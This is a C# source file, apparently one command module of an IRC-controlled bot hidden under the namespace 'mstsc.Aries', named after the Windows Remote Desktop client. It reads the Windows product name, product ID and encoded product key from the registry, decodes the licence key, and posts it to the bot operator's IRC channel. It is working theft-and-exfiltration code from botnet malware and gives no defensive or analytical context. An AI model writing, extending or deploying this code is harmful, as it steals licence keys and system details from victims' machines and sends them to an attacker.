using System;
using Microsoft.Win32;
using System.Collections;

namespace mstsc.Aries.Commands
{
sealed class WindowsKey
    {
        public WindowsKey()
        {
            try
            {
                RegistryKey CurrentVersion = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
                Main.Instance.IRCClient.MessageCurrentChannel("{WindowsKey} OS: " + CurrentVersion.GetValue("ProductName") +
                    " // Product ID: " + CurrentVersion.GetValue("ProductID") +
                    " // Product Key: " + DecodeProductKey(CurrentVersion.GetValue("DigitalProductId") as byte[]));

                CurrentVersion.Close();
                GC.Collect();
                GC.WaitForPendingFinalizers();
                GC.Collect();
            }
            catch (Exception Exception)
            {
                Main.Instance.IRCClient.MessageCurrentChannel("{WindowsKey} An error has occured: " + Exception.Message);
            }
        }

        /// <summary>
        /// Decode the Windows DigitalProductId and return the key used to register Windows, 
        /// use registry key DigitalProductId
        /// </summary>
        /// <param name="digitalProductId">The Windows DigitalProductId found in the Registry</param>
        public string DecodeProductKey(byte[] digitalProductId)
        {
            // Offset of first byte of encoded product key in 
            //  'DigitalProductIdmstsc" REG_BINARY value. Offset = 34H.
            const int keyStartIndex = 52;
            // Offset of last byte of encoded product key in 
            //  'DigitalProductIdmstsc" REG_BINARY value. Offset = 43H.
            const int keyEndIndex = keyStartIndex + 15;
            // Possible alpha-numeric characters in product key.
            char[] digits = new[]
      {
        'B', 'C', 'D', 'F', 'G', 'H', 'J', 'K', 'M', 'P', 'Q', 'R', 
        'T', 'V', 'W', 'X', 'Y', '2', '3', '4', '6', '7', '8', '9',
      };
            // Length of decoded product key
            const int decodeLength = 29;
            // Length of decoded product key in byte-form.
            // Each byte represents 2 chars.
            const int decodeStringLength = 15;
            // Array of containing the decoded product key.
            char[] decodedChars = new char[decodeLength];
            // Extract byte 52 to 67 inclusive.
            ArrayList hexPid = new ArrayList();
            for (int i = keyStartIndex; i <= keyEndIndex; i++)
            {
                hexPid.Add(digitalProductId[i]);
            }
            for (int i = decodeLength - 1; i >= 0; i--)
            {
                // Every sixth char is a separator.
                if ((i + 1) % 6 == 0)
                {
                    decodedChars[i] = '-';
                }
                else
                {
                    // Do the actual decoding.
                    int digitMapIndex = 0;
                    for (int j = decodeStringLength - 1; j >= 0; j--)
                    {
                        int byteValue = (digitMapIndex << 8) | (byte)hexPid[j];
                        hexPid[j] = (byte)(byteValue / 24);
                        digitMapIndex = byteValue % 24;
                        decodedChars[i] = digits[digitMapIndex];
                    }
                }
            }
            return new string(decodedChars);
        }

    }
}
